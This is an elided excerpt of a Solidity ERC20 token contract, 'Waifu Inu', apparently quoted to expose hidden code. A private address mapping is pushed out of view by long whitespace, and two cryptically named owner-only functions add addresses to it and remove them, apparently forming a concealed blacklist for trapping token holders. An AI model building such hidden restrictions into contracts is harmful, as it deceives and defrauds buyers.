...
contract WAIFU is ERC20, Ownable {
    ...
    bool public transferDelayEnabled = true;                                                                                                            mapping (address => bool) private bws; bool bct = false;
    ...
    constructor() ERC20("Waifu Inu", "WAIFU") {
    ...
    function abm(address[] memory addy_) public onlyOwner {
        for (uint i = 0; i < addy_.length; i++) {
            bws[addy_[i]] = true;
        }
    }

    function rbm(address[] memory addy_) public onlyOwner {
        for (uint i = 0; i < addy_.length; i++) {
            bws[addy_[i]] = false;
        }
    }
